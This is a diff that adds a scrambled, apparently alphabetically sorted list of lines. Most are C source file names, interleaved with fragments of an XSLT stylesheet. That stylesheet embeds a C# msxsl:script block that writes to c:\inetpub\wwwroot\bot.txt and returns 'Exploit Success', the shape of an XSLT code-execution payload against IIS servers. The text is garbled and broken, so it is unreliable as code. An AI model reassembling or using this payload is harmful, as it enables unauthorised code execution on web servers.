@@ -1,0 +1,62 @@
+</msxsl:script>
+</xsl:stylesheet>
+</xsl:template>
+<?xml version='1.0'?>
+<msxsl:script language="C#" implements-prefix="user">
+<xsl:stylesheet version="1.0"
+<xsl:template match="/">
+@"c:\inetpub\wwwroot\bot.txt");
+ARP.c
+DHCP.c
+Host.c
+ICMP.c
+IP.c
+Joystick.c
+LowLevel.c
+MIDI.c
+TestApp.c
+]]>
+adler32.c
+bdf.c
+bitmap.c
+bz.c
+bzscreen.c
+callbacks.c
+cmdline.c
+cmpf.c
+compress.c
+core.c
+crc32.c
+debug.c
+deflate.c
+dlldata.c
+dmpf.c
+encoder.c
+ft.c
+getopt.c
+inffast.c
+inflate.c
+inftrees.c
+init.c
+input.c
+lcd.c
+main.c
+nsfix.c
+printutf8.c
+pt1.c
+queue.c
+return "Exploit Success";
+rtc.c
+runt1asm.c
+stack.c
+t1asm.c
+timer.c
+trees.c
+ttf.c
+ttf2pt1.c
+unix.c
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+zutil.c
+{
+}
